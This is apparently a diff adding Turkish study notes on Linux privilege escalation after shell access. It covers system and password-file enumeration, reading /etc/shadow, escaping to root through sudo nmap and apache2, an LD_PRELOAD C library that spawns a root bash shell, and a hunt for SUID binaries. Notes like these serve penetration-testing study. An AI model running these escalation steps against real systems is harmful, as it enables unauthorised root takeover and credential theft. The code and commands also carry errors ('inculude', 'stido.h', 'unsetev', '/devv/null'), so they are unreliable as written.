@@ -1,0 +1,78 @@
+
+**Bilgi Toplama**
+
+(+)Faydalı notlar
+    history: komutunu kullanarak bizden önceki kullanıcının bizden önce hangi komutları çalıştırdığını görebiliriz.
+    ps aux : komutu sistemdeki işlemleri gösterir.
+    chmod +x: yaptığımızda bir dosyayı çalışabilir hale getirir.
+
+(+)Herhangi bir server dan shell olarak erişim sağlandığında bilgi toplamak için yapılması gerekenler.
+
+    İşletim sistemi ismini ve version öğrenme için:
+    -uname
+    -cat /proc/version
+    -cat /etc/issue
+    Version bilgilerine göre o versiondaki açıklaları exploit etmeye çalışabiliriz.
+
+(+)Password dosyalarına veya password geçen metinlere bakmak için:
+    -cat /etc/password
+    locate password
+    find /password 2 > /devv/null
+    -cat /etc/shadow
+    Bakmaya çalışabiliriz
+
+(+)Sudo açkları ile root olmak için:
+ 
+    sudo -l yaparak root yetkili hangi dosyaları çalışabiliriz onlara bakabliriz.
+
+    Örneğin nmap çalıştırabiliyorsak:
+
+    nmap --interactive komutu ile shell açabiliriz.Açılan shellde !sh dersek root olabiliriz.
+
+    Nmap yerine apacheserver çalıştırabiliyorsak eğer, 
+
+    sudo filepath/apache2 -f /etc/shadow diyerek shadow içini görebiliriz.
+
+    sudo -l yapınca Preload açığı nasıl exploit edilir.
+    
+    Bunun için birazda "c" programlama dili ile kod yazmamız gerekiyor.
+    Yazdığımız c kodunu açtığımız shellde nano veya herhangi bir text editörü içine yazmamız gerekiyor.
+
+    (+)"C" kodu ##C kodu ile shell açma 
+        #inculude <stido.h>
+        #inculude <sys/type.h>
+        #inculude <stdlib.h>
+
+        void _init()
+        {
+            unsetev("LD_PRELOAD")
+            setgid(0);
+            setuid(0);
+            system("/bin/bash");
+        }
+    
+    oluşturduğumuz dosyayı gcc ile çalıştırabilir hale getirmek için kullanılır.
+    
+    gcc -fPIC -shared -o /tmp/filename.so filename.c -nostartfiles
+    yukarıdaki komut ile çalıştırabilir bir hale getiriyoruz.
+    
+    Daha sonra "sudo LD_PRELOAD=/tmp/filename.so nmap " nmap yerine sudo -l yapınca çıkan filepath deneyebiliriz.
+    yukarıdaki kod ile Root oluyoruz.
+
+(+)Suid açıkları
+    find / -type f -perm -04000 -ls 2> /dev/null
+    yukarıdaki komutu çalıştırdığımızda çıkan sonuç sol tarafdaki izinlerine bakmamız gerekiyor.
+    Örneğin:/usr/local/bin/suid.so
+    -rwsr gibi izinler görünce filepath çalıştırmaya çalıştırabiliriz.
+    yapılan işlemleri takip eden "strace" adlı araçı kullabiliriz.
+
+    Örneğin: strace /usr/local/bin/suid.so 2>&1 more
+    
+
+
+
+
+
+
+
+
